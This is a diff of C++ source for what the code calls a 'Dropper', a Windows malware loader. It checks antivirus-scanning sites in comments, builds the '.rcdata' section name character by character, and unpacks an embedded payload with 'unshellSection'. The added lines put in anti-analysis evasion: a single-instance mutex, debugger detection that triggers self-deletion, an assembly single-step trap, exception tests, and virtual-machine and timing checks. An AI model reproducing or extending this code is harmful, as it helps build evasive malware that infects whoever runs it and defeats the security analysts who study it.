@@ -11,6 +11,10 @@
 #include "escape.h"
 #include "DllExport.h"
 #include "Public.h"
+#include "utils.h"
+#include "vm.h"
+#include "antiDetect.h"
+
 //http://www.virustotal.com
 //http://www.virscan.org
 //Dropper 
@@ -35,6 +39,8 @@ int gType = 0;
 HMODULE ghPEModule = 0;
 int gPEImageSize = 0;
 
+extern "C" int asmSingleTrap();
+
 char* ghThisHandle = 0;
 HINSTANCE ghprevInstance = 0;
 LPSTR glpCmdLine = 0;
@@ -43,6 +49,8 @@ int gnShowCmd = 0;
 ptrmain glpmain = 0;
 ptrDllMainEntry glpDllMainEntry = 0;
 ptrWinMain glpWinMain = 0;
+
+HANDLE g_mutex_handle = 0;
 
 
 
@@ -109,18 +117,34 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 #endif
 	int ret = 0;
+	runLog("starting\r\n");
 
-	//ret = Escape::escape();
+	g_mutex_handle = bRunning(&ret);
+	if (ret)
+	{
+		runLog("already running\r\n");
+		suicide();
+	}
+
+
+	if (Debug::isDebugged())
+	{
+		runLog("Debugged\r\n");
+		suicide();
+
+		return FALSE;
+	}
+	Debug::attach();
+
+	asmSingleTrap();
+
+	ret = exceptTest();
 
 	ret = getapi();
 
-#ifndef _DEBUG
-	if (Debug::PEB_BegingDebugged())
-	{
-		Public::writelog("debuggered\r\n");
-		return FALSE;
-	}
-#endif
+	VM::checkVM();
+
+	VM::checkTickCount();
 
 	ghThisHandle = (char*)hInstance;
 	ghprevInstance = hPrevInstance;
@@ -128,6 +152,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	gnShowCmd = nShowCmd;
 
 	char secname[] = { '.','r','c','d','a','t','a',0 };
+
+	runLog("unshellSection\r\n");
 
 	ret = Section::unshellSection((char*)hInstance, secname);
 
